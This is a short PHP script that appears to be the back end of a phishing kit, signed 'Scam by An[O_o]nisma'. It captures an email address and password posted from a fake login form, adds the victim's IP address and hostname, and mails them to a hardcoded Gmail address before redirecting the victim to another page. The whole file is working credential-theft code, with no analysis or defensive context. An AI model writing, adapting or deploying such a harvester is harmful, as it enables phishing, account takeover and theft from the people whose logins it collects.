<?php




$ip = getenv("REMOTE_ADDR");                                                                          
$hostname = gethostbyaddr($ip);
$message .= "|------==>Scam by An[O_o]nisma <===------|\n";
$message .= "|EML    : ".$_POST['Anonisma']."\n";
$message .= "|PSSD : ".$_POST['Anonismaaa']."\n";
$message .= "|----|Info Vic|-----|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|HostName : ".$hostname."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|------==>Scam by An[O_o]nisma <===------|\n";
$send = "hamilanors@gmail.com";
$subject = " Nuevos resultados / $ip";
{
mail("$send", "$subject", $message);   
}
header("Location:../info.html");

                   

?>
